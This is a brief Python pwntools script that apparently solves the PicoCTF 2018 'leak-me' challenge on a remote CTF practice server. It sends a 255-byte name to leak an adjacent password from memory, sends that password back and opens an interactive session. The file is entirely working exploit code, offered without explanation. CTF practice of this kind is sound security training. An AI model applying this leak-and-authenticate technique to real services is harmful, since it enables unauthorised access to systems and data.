from pwn import *

#context.log_level = 'debug'

#p = process('./PicoCTF_2018_leak-me')
p = remote('node4.buuoj.cn', 25723)

name = b'a' * 255
p.sendafter(b'What is your name?\n', name)
p.recv(0x106)
password = p.recvuntil(b'\n')[:-1]
#gdb.attach(p, 'b *0x8048895')
p.sendline(password)

p.interactive()